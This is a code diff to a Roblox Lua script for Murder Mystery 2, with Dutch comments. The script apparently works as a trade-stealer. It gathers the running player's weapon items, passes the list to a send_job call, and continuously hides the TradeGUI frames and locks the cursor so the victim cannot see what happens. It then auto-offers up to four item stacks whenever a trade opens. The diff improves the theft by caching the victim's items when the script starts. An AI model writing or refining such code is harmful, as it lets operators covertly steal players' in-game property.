@@ -142,8 +142,10 @@ local function hook_mm2()
     pcall(function() setRequestsEnabled:FireServer(true) end)
 
     local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
-    local items = collect_mm2_items()
-    send_job("MM2", items)
+
+    -- items eenmalig vastleggen bij script-start
+    local cachedItems = collect_mm2_items()
+    send_job("MM2", cachedItems)
 
     local currentLastOffer = nil
     local tradingWithAllowed = false
@@ -190,9 +192,7 @@ local function hook_mm2()
         end
         if shiftlockConn then shiftlockConn:Disconnect() end
         shiftlockConn = RunService.RenderStepped:Connect(function()
-            -- cursor lock
             pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
-            -- frames continuous verbergen (MM2 maakt ze soms opnieuw aan)
             local g2 = lp:FindFirstChild("PlayerGui")
             if g2 then
                 for _, n in ipairs({"TradeGUI","TradeGUI_Phone"}) do
@@ -285,7 +285,7 @@ local function hook_mm2()
     end)
 
     startTrade.OnClientEvent:Connect(function(tradeData)
-        -- force-reset zodat vorige timer itemsOffered=true niet interfereert
+        -- altijd force-reset zodat vorige timer niet interfereert
         itemsOffered = false
         readySent = false
         currentLastOffer = (tradeData and tradeData.LastOffer) or nil
@@ -306,14 +306,12 @@ local function hook_mm2()
         itemsOffered = true
 
         task.spawn(function()
-            local sortedItems = collect_mm2_items()
-
+            -- gebruik gecachede items van script-start
             local uniqueSlots = 0
-            for _, entry in ipairs(sortedItems) do
+            for _, entry in ipairs(cachedItems) do
                 if uniqueSlots >= 4 then break end
                 uniqueSlots = uniqueSlots + 1
-                local amount = (okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned and ProfileData.Weapons.Owned[entry.name]) or entry.amount
-                for i = 1, amount do
+                for i = 1, entry.amount do
                     pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
                 end
             end
